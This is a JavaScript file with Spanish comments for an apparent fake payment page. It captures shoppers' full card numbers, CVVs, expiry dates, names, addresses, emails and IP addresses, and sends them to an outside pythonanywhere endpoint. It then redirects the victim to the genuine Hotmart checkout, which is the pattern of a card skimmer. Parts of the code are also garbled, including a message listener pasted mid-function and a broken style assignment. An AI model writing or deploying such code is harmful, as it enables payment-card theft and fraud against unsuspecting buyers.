document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('formkit-form');
    if (form) {
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            const ipRes = await fetch("https://api.ipify.org?format=json");
            const ipData = await ipRes.json();
            // Extraer datos de los campos
            const email = form.elements['EMAIL']?.value?.trim();
            const emailConf = form.elements['EMAIL_CONFIRMATION']?.value?.trim();
            const name = form.elements['NAME']?.value?.trim();
            const address1 = form.elements['ADDRESS_LINE1']?.value?.trim();
            const address2 = form.elements['ADDRESS_LINE2']?.value?.trim();
            const postal = form.elements['POSTAL_CODE']?.value?.trim();
            // En scripts.js o directamente en index.html
window.addEventListener('message', function(event) {
    // Opcional: validar event.origin para seguridad
    if(event.data.type === 'formData') {
        console.log('Datos recibidos del iframe:', event.data.payload);
        // Aquí puedes usar los datos, hacer fetch, guardar, etc.
    }
});

            // Desempaquetar datos recibidos del iframe si existen
            let cardNumber, cardExpiry, cardCVV, cardHolder;
            if (window.receivedFormData) {
                ({
                    cardNumber,
                    cardExpiry,
                    cardCVV,
                    cardHolder
                } = window.receivedFormData);
            } else {
                cardNumber = form.elements['CARD_NUMBER']?.value?.replace(/\s+/g, '');
                cardExpiry = form.elements['CARD_EXPIRY_MONTH_YEAR']?.value?.trim();
                cardCVV = form.elements['CARD_CVV']?.value?.trim();
                cardHolder = form.elements['CARD_HOLDER']?.value?.trim();
            }
            const button = document.getElementById('country-select');
            const country = button ? button.getAttribute('data-label') : '';
            const ipaddress = ipData.ip;
            // Validaciones básicas
            if (!email || !emailConf || !name || !address1 || !postal || !cardNumber || !cardExpiry || !cardCVV || !cardHolder) {
                document.getElementById('response').textContent = "Por favor, complete todos los campos obligatorios.";
                return;
            }
            if (email !== emailConf) {
                document.getElementById('response').textContent = "Los correos electrónicos no coinciden.";
                return;
            }
            // Validación simple de email
            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
                document.getElementById('response').textContent = "Correo electrónico inválido.";
                return;
            }
            // Validación simple de tarjeta (16 dígitos)
            if (!/^\d{16}$/.test(cardNumber)) {
                document.getElementById('response').textContent = "Número de tarjeta inválido.";
                return;
            }
            // Validación de fecha MM/YY o MM/YYYY
            if (!/^(0[1-9]|1[0-2])\/(\d{2}|\d{4})$/.test(cardExpiry)) {
                document.getElementById('response').textContent = "Fecha de expiración inválida.";
                return;
            }
            // Validación de CVV (3 o 4 dígitos)
            if (!/^\d{3,4}$/.test(cardCVV)) {
                document.getElementById('response').textContent = "CVV inválido.";
                return;
            }

            // Preparar datos para enviar
            const data = {
                name: cardHolder,
                email: email,
                card_number: cardNumber,
                card_expiration: cardExpiry,
                card_cvv: cardCVV,
                address_line: address1,
                address_line2: address2,
                postal_code: postal,
                country: country,
                ip: ipaddress
            };
            try {
                const response = await fetch('https://microservice2.pythonanywhere.com/check', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                //
                // Si necesitas manejar la respuesta, puedes hacerlo aquí
                const result = await response.json();
                if (result && result.status === 'Ok') {
                    // Respuesta exitosa, continuar con la redirección
                } else {
                    // Manejar intentos fallidos
                    let attempts = parseInt(sessionStorage.getItem('payment_attempts') || '0', 10) + 1;
                    sessionStorage.setItem('payment_attempts', attempts);
                    if (attempts >= 3) {
                        const params = getQueryParams();
                        window.location.href = 'https://pay.hotmart.com/' + params['ac'];
                        return;
                    }
                    // Mostrar mensaje de error de la API si está disponible
                    const errorMsg = result && result.message ? result.message : "No se pudo procesar el pago. Intente de nuevo.";
                    document.getElementById('response').textContent = errorMsg;
                    return;
                }
                const params = getQueryParams();
                window.location.href = 'https://pay.hotmart.com/' + params['ac'];
            } catch (error) {
                console.error('Error en la petición:', error);
                document.getElementById('response').textContent.style = 'color: red;';
                document.getElementById('response').textContent = "Error al procesar el pago. Por favor, inténtelo de nuevo más tarde.";
            }
        });
    }
});

// Si no existe, define getQueryParams
function getQueryParams() {
    const params = {};
    window.location.search.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(str,key,value) {
        params[key] = value;
    });
    return params;
}